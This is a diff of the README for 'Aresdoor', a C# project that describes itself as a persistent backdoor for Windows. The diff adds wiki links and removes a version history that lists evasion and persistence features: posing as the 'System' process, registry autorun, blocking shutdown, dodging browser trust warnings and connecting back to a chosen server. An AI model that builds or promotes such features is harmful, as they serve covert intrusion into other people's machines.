@@ -1,5 +1,10 @@
-# Aresdoor v1.2
+# Aresdoor v1.2.1
 ###  Yet another persistant backdoor for Windows, in C#
+
+**Read the [Aresdoor Wiki](https://github.com/BlackVikingPro/aresdoor/wiki)**
+
+**View [update history archive](https://github.com/BlackVikingPro/aresdoor/blob/master/updates.md)**
+
 ***
 
 ### Features
@@ -17,20 +22,6 @@
  * Create server-side application
  * Encrypt/Decrypt TCP data sent to/from client/server
  * Add support for Powershell command line
-
-***
-### Version History
- * ### v1.2
-   - Fixed change directory bug for command line
-   - Add option to prevent shutdown (built into the code)
-   - Changed process name to "System" to help "hide in plain sight"
-   - Can now insert itself into registry to autorun on bootup (use 'setStartup' in backdoored command line)
- * ### v1.1
-   - Add command line switches for modifying server and port to connect back to
-   - Clean up source code for easier managment
-   - Added more trust in executable so browsers are unlikely to pick it up as 'untrustworthy'
- * ### v1.0
-   -  Initial Release
 
 ***
 
